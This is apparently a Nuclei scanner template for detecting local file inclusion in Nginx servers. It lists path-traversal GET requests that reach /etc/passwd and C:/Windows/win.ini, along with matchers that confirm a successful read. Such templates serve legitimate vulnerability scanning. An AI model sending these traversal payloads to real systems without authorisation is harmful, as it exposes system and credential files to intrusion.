http:
- matchers:
  - part: body
    regex:
    - 'root:.*:0:0:'
    type: regex
  - condition: or
    part: body
    type: word
    words:
    - bit app support
    - '[fonts]'
    - '[extensions]'
    - '[mci extensions]'
  matchers-condition: or
  method: GET
  path:
  - '{{BaseURL}}/#/../../../../../../../C:/Windows/win.ini'
  - '{{BaseURL}}/#/../../../../../../../etc/passwd'
  - '{{BaseURL}}/../../../../a/../../../C:/Windows/win.ini'
  - '{{BaseURL}}/../../../../a/../../../etc/passwd'
  - '{{BaseURL}}/..;/..;/C:/Windows/win.ini'
  - '{{BaseURL}}/..;/..;/etc/passwd'
  - '{{BaseURL}}/////..;/..;/C:/Windows/win.ini'
  - '{{BaseURL}}/////..;/..;/etc/passwd'
  - '{{BaseURL}}//////////////////../../../../../../../../etc/passwd'
  - '{{BaseURL}}///////////////////../../../../../../C:/Windows/win.ini'
  - '{{BaseURL}}///////////////////etc/passwd'
  - '{{BaseURL}}/;/..;/..;/C:/Windows/win.ini'
  - '{{BaseURL}}/;/..;/..;/etc/passwd'
  - '{{BaseURL}}/?../../../../../../../C:/Windows/win.ini'
  - '{{BaseURL}}/?../../../../../../../etc/passwd'
  - '{{BaseURL}}/?/../../../../../../../C:/Windows/win.ini'
  - '{{BaseURL}}/?/../../../../../../../etc/passwd'
  - '{{BaseURL}}/assets/css///////../../../../../../../../etc/passwd'
  stop-at-first-match: true
id: nginx-path-traversal
info:
  author: p0ch4t,reewardius
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-22
  description: Nginx server is vulnerable to local file inclusion.
  name: Nginx Server - Local File Inclusion
  reference:
  - https://github.com/detectify/ugly-duckling/blob/master/modules/crowdsourced/nginx-merge-slashes-path-traversal.json
  - https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d
  - https://github.com/stark0de/nginxpwner
  severity: high
  tags: lfi,lfr,nginx,generic
